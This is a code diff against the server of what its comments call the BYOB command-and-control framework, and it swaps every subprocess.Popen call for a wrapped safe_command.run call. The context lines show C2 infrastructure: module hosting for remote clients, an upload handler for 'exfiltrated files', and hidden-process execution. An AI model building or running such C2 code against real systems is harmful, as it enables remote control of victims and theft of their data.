@@ -19,6 +19,7 @@ import datetime
 import threading
 import subprocess
 import collections
+from security import safe_command
 
 http_serv_mod = "SimpleHTTPServer"
 if sys.version_info[0] > 2:
@@ -128,13 +129,13 @@ def main():
     globals()['debug'] = options.debug
 
     # host Python packages on C2 port + 2 (for clients to remotely import)
-    globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+    globals()['package_handler'] = safe_command.run(subprocess.Popen, '{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
 
     # host BYOB modules on C2 port + 1 (for clients to remotely import)
-    globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
+    globals()['module_handler'] = safe_command.run(subprocess.Popen, '{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
 
     # run simple HTTP POST request handler on C2 port + 3 to handle incoming uploads of exfiltrated files
-    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
+    globals()['post_handler'] = safe_command.run(subprocess.Popen, '{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
 
     # run C2
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
@@ -444,11 +445,11 @@ class C2():
                 info = subprocess.STARTUPINFO()
                 info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                 info.wShowWindow = subprocess.SW_HIDE
-                self.child_procs[name] = subprocess.Popen(args, startupinfo=info)
+                self.child_procs[name] = safe_command.run(subprocess.Popen, args, startupinfo=info)
                 return "Running '{}' in a hidden process".format(path)
             except Exception as e:
                 try:
-                    self.child_procs[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
+                    self.child_procs[name] = safe_command.run(subprocess.Popen, args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                     return "Running '{}' in a new process".format(name)
                 except Exception as e:
                     util.log("{} error: {}".format(self.execute.__name__, str(e)))
@@ -875,7 +876,7 @@ class C2():
         while True:
             time.sleep(3)
             globals()['package_handler'].terminate()
-            globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
+            globals()['package_handler'] = safe_command.run(subprocess.Popen, '{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
 
     def run(self):
         """
@@ -912,7 +913,7 @@ class C2():
                         except: pass
                     else:
                         try:
-                            output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
+                            output = str().join((safe_command.run(subprocess.Popen, cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
                         except: pass
                     if output:
                         util.display(str(output))
